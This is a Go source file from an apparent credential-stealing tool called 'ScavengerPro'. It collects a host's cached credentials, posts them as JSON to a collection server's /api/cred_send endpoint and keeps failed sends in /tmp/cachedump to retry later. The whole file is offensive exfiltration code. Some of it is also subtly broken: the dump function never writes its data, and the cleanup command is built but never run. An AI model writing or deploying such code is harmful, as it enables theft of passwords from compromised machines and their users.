// ship the credential cache to the server
// @author: degenerat3

package main

import(
	"fmt"
	"net/http"
	"bytes"
	"encoding/json"
	"ScavengerPro/client/cred_cache"
	"os"
	"os/exec"
	"bufio"
)

var serv = "127.0.0.1:5000" 	//IP of server

func send_data(c cred_cache.CredCache){
	path := "/tmp/cachedump"
	h := c.Get_hostname()
	creds := c.Get_entries()
	previous_dump := fetch_dump(path)
	if previous_dump !=nil{
		for _,c := range previous_dump{
			creds = append(creds, c)
		}
	}
	cred_str := ""
	for _,cd := range creds{
		cred_str += cd + "\n"
	}
	fmt.Printf("%s\n", h)
	fmt.Printf("%s\n", creds)
	url := "http://" + serv + "/api/cred_send"	//turn ip into URL
	jsonData := map[string]string{"hostname": h, "credentials": cred_str}
	jsonValue, _ := json.Marshal(jsonData)
	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
	if err != nil{
		// TODO: write to disk if it fails
		path := "/tmp/cachedump"
		dump_cache(creds, path)
		return
	}

}

func dump_cache(creds []string, path string){
	_, err := os.Stat(path)
	var f *os.File
	cstr := ""
	for _, cred := range creds {
		cstr += cred + "\n"
	}
	if os.IsNotExist(err){
		f, _ = os.Create(path)
		defer f.Close()
	} else{
		f, _ = os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0600)
	}

	return
}

func fetch_dump(path string) []string{
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()
	var data []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan(){
		data = append(data, scanner.Text())
	}
	com := "rm " + path
	exec.Command(com)
	return data
}


func ship_it(c cred_cache.CredCache, min int){
	if c.Count_entries() < min{
		return	// not enough passwords to ship
	}
	send_data(c)
	return
}

func main(){
	c := cred_cache.CredCache {
		Hostname: "malBox",
		Credentials: []string{"jim:letmein","dragon:nomnom"},
	}
	send_data(c)
}
